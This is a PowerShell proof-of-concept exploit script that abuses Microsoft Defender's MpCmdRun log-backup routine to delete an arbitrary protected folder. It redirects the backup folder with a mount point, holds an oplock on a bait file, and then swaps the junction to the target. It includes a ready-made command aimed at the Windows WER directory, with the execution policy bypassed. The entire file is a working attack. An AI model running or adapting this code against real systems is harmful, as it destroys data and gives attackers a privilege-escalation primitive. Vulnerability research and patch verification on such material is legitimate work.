# Testing 
# powershell -ep bypass -c ". .\DefenderArbitraryFileDelete.ps1; DoMain -TargetFolder 'C:\ZZ_SANDBOX\WER'"
# Real 
# powershell -ep bypass -c ". .\DefenderArbitraryFileDelete.ps1; DoMain -TargetFolder 'C:\ProgramData\Microsoft\Windows\WER'

$JobCode = {
    function DoMpCmdRunLogFileWriteTriggerJob {

        [CmdletBinding()] param()

        $CommandSimple = "Update-MpSignature"
        $CommandAdvanced = "Update-MpSignature -UpdateSource InternalDefinitionUpdateServer -ErrorAction SilentlyContinue"
        
        $CommandSimpleTime = Measure-Command -Expression { Invoke-Expression $CommandSimple }
        $CommandAdvancedTime = Measure-Command -Expression { Invoke-Expression $CommandAdvanced }
        
        if ($CommandAdvancedTime -lt $CommandSimpleTime) {
            $Command = $CommandAdvanced
        } else {
            $Command = $CommandSimple
        }
            
        while ($True) {
            Invoke-Expression -Command $Command
        }
    }
}

function DoMain {

    [CmdletBinding()] param(
        [Parameter(Mandatory=$True)][string] $TargetFolder
    )

    $TimeoutInMinutes = 240
    $StartDate = Get-Date 
    $Success = $False

    $TargetFolderPath = Resolve-Path -Path $TargetFolder -ErrorAction Stop 
    
    if (-not [System.IO.Directory]::Exists($TargetFolderPath)) {
        Write-Host "[-] Target folder doesn't exist." -ForegroundColor Red
        return
    }

    ### Load NtApiDotNet
    $PathCurrentDirectory = Get-Location 
    $PathNtApiDotNet = Join-Path -Path $PathCurrentDirectory -Child "NtApiDotNet.dll"
    Import-Module "$PathNtApiDotNet" -ErrorAction "Stop"
    Write-Host "[*] Loaded '$PathNtApiDotNet'"
    
    ### Prepare workspace
    # Create workspace directory
    $WorkspaceFolderPath = Join-Path -Path $env:TEMP -ChildPath $([Guid]::NewGuid())
    $Null = New-Item -Path $WorkspaceFolderPath -ItemType Directory

    # Fake target folder
    $TargetFolderName = Split-Path -Path $TargetFolderPath -Leaf 
    $TargetFolderParent = Split-Path -Path $TargetFolderPath -Parent 
    $FakeTargetFolderPath = Join-Path -Path $WorkspaceFolderPath -ChildPath $TargetFolderName
    $Null = New-Item -Path $FakeTargetFolderPath -ItemType Directory

    # Fake directory structure
    Get-ChildItem -Path $TargetFolderPath -ErrorAction Stop | ForEach-Object {
        $Path = Join-Path -Path $FakeTargetFolderPath -ChildPath $_.Name
        if ([System.IO.Directory]::Exists($_.FullName)) {
            $Null = New-Item -Path $Path -ItemType Directory 
        } else {
            $Null = New-Item -Path $Path -ItemType File 
        }
    }

    ### Prepare bait file
    $BaitFolderPath = Join-Path -Path $WorkspaceFolderPath -ChildPath "0000"
    $Null = New-Item -Path $BaitFolderPath -ItemType Directory
    $BaitFilePath = Join-Path -Path $BaitFolderPath -ChildPath "bait.txt"
    $Null = New-Item -Path $BaitFilePath -ItemType File 

    ### Create fake MpCmdRun.log.bak as a mountpoint to our workspace 
    # Create folder 
    $MpCmdRunBakFolderPath = Join-Path -Path $([System.Environment]::GetEnvironmentVariable('TEMP','Machine')) -ChildPath "MpCmdRun.log.bak"
    $Null = New-Item -Path $MpCmdRunBakFolderPath -ItemType Directory -ErrorAction SilentlyContinue -ErrorVariable $ErrorNewItem
    if (-not $ErrorNewItem) {

        ### Set MpCmdRun.log.bak folder as a mountpoint to our fake folder
        [NtApiDotNet.NtFile]::CreateMountPoint("\??\$MpCmdRunBakFolderPath", "\??\$WorkspaceFolderPath", $null) 
        Write-Host "[*] Mountpoint: '\??\$($MpCmdRunBakFolderPath)' --> '\??\$($WorkspaceFolderPath)'"

        ### Set oplock on bait file 
        $BaitNtFile = [NtApiDotNet.NtFile]::Open("\??\$BaitFilePath", $null, [NtApiDotNet.FileAccessRights]::ReadAttributes, [NtApiDotNet.FileShareMode]::All, [NtApiDotNet.FileOpenOptions]::None)
        $BaitOpLockTask = $BaitNtFile.OplockExclusiveAsync()
        Write-Host "[*] OpLock set on '\??\$($BaitFilePath)'"

        ### Start MpCmdRun.log file write trigger
        Write-Host "[*] Starting log file write job."
        $LogFileWriteJob = Start-Job -InitializationScript $JobCode -ScriptBlock { DoMpCmdRunLogFileWriteTriggerJob }

        ### Monitor OpLock in a loop until success or timeout
        # If oplock triggered, switch mountpoint 
        Write-Host "[*] Waiting for the OpLock to be triggered (timeout=$($TimeoutInMinutes) min)..."
        While ($True) {

            # Timeout?
            $CurrentDate = Get-Date 
            $TimeSpan = New-TimeSpan -Start $StartDate -End $CurrentDate
            $TimeRemaining = [Math]::Floor($TimeoutInMinutes - $TimeSpan.TotalMinutes)
            if ($TimeSpan.TotalMinutes -gt $TimeoutInMinutes) {
                Write-Host "[!] Operation timed out"
                break
            }

            # Check OpLock
            if ($BaitOpLockTask.IsCompleted) {

                Write-Host "[+] OpLock triggered! Switching mount point." -ForegroundColor Green 

                [NtApiDotNet.NtFile]::DeleteReparsePoint("\??\$MpCmdRunBakFolderPath") | Out-Null
                [NtApiDotNet.NtFile]::CreateMountPoint("\??\$MpCmdRunBakFolderPath", "\??\$TargetFolderParent", $null) 
                Write-Host "[*] Mountpoint: '\??\$($MpCmdRunBakFolderPath)' --> '\??\$($TargetFolderParent)'"

                Write-Host "[*] Releasing OpLock."
                $BaitNtFile.AcknowledgeOplock([NtApiDotNet.OplockAcknowledgeLevel]::No2)

                Start-Sleep -Seconds 2
                if (-not (Test-Path -Path $TargetFolderPath)) {
                    $Success = $True
                    Write-Host "[*] Target directory '$($TargetFolderPath)' was removed."
                } else {
                    Write-Host "[!] Target directory '$($TargetFolderPath)' wasn't removed."
                }

                break
            }

            # Update status 
            $Percentage = [Math]::Floor(($TimeSpan.TotalMinutes) * 100 / $TimeoutInMinutes)
            Write-Progress -Activity "Wait until success or timeout" -Status "Time remaining before timeout: $($TimeRemaining) min ($($Percentage)%)." -PercentComplete $Percentage 

            Start-Sleep -Seconds 5
        }

        if ($BaitNtFile) {
            $BaitNtFile.Close()
        }

    } else {
        Write-Host "[-] Failed to create directory '$($MpCmdRunBakFolderPath)'" -ForegroundColor Red 
    }

    if ($Success) {
        $ElapsedTime = New-TimeSpan -Start $StartDate -End $(Get-Date)
        Write-Host "[+] Exploit successfull! Elapsed time: $($ElapsedTime.ToString())." -ForegroundColor Green
    } else {
        Write-Host "[-] Exploit failed." -ForegroundColor Red
    }

    ### Cleanup
    Start-Sleep -Seconds 2
    if ($LogFileWriteJob) {
        Stop-Job -Job $LogFileWriteJob
    }
    if ([System.IO.Directory]::Exists($WorkspaceFolderPath)) {
        Remove-Item -Path $WorkspaceFolderPath -Recurse -Force -ErrorAction SilentlyContinue
    }
    if ([System.IO.Directory]::Exists($MpCmdRunBakFolderPath)) {
        Remove-Item -Path $MpCmdRunBakFolderPath -Recurse -Force -ErrorAction SilentlyContinue
    }
}